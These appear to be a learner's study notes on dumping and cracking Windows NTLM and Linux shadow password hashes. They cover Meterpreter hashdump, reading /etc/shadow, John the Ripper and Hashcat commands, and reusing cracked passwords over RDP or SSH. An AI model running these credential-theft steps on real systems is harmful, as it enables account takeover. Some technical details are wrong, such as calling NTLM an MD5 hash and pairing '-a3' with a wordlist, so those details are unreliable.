

## Windows Hashes


- WIndows OS stores hashed user account passwords in SAM database (locally)
	- when you enter cleartext password - it is hashed - compared to hash stored 
	- SAM database cannot be copied when the operating system is running 
	- The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process 
	- Elevated/Admin privileges are required in order to access and interact with the LSASSS process. 
	- In modern versions of Windows, the SAM databases is encrypted with a syskey
- Authentication and verification of user credentials is facilitated by the local security authority (LSA)
- Windows versions up to Windows server 2003 utilize two different types of hashes: 
	- LM (disabled)
	- NTLM (from windows vista on..)
		- Authentication between computers. 
		- MD5 hash 
![[Pasted image 20230925191444.png]]

- We can dump windows password hashes by using: 
	- Inbuilt meterpreter "hashdump" command 
	- Mimikatz 
- After dumping the hashes we can crack them through the use of:
	- John The Ripper 
	- Hashcat 


##### NTLM hashes 

- find vulnerability and exploit it 
- migrate to ``lsass`` (upgrade meterpreter session and stablize)
- check if you need to elevate priviliges
- ``hashdump``
- ``shell`` 
	- ``net`` ``user`` (check if you have all the hashes of the users on system)
terminate shell 

New terminal: 
-`` vim hashes.txt ``- paste the hashes 
- ``cat hashes.txt ``

**how to crack ntlm hashes with John the ripper?** 
- ``john to see manual ``
- ``john --list=formats `` lijst met mogelijkheden
- `` john --list=formats | grep NT ``  
- ``john --format=NT file_that_contains_hashes --wordlist=/usr/share.wordlist/rockyou.txt ``
  (if you do not specify wordlist than john will use default wordlist)
``gzip -d /usr/share/wordlists/rockyou.txt.gz  ``
the rockyou wordlist is always zipped. unzip before using it 


**method 2 - Crack with hashcat** 

- ``hashcat --help ``
- specify the hash type with ``-m ``
	  ``-m hash_type_id ``(scrol down to find them )
![[Pasted image 20230925195424.png]]
``hashcat -a3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt ``


Use the cracked hashes to login with rdp/ssh/pssexec 
![[Pasted image 20230925195711.png]]
if port 3389 is open use xfreerdp 








## Linux hashes 


- Linux has multi-user support (multiple users can access the system simultaneously). 
- All of information for all accounts on Linux is stored in the passwd file located in: /etc/passwd 
- We cannot files the passwords for the users in the passwd file because they are encrypted.
- The passwd file is readable by any user on the system 
- The encrypted passwords for the users are stored in the shadow file. It can be found in the following directory: /etc/shadow 
- The shadow file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords. 

![[Pasted image 20230925202424.png]]






##### Linux Password Hashes 


- ``cat /etc/shadow``
- put the session in the background 
- upgrade the session to meterpreter session 
- use ``hashdump`` module (post linux gather) (this module is only for linux
- ``set session ``
- run (dumps root user hash)
- ``cat`` content of text file with the hash 
- copy the path where the hash is stored 
- exit from metasploit console 
- decomprese rockyou wordlist ``gzip`` 


*How to crack hash with John the Ripper?*  Make sure you know what kind of encryption method is used. 
-`` john --format=sha512crypt path_that_contain_hash.txt --wordlist=/usr/share/wordlsits/rockyou.txt ``

*How to crack with hashcat?* 
- ``hashcat --help | grep 1800``   (1800 is sha512)
- ``hashcat -a3 -m 1800 path_contains_hashes.txt wordlist_path``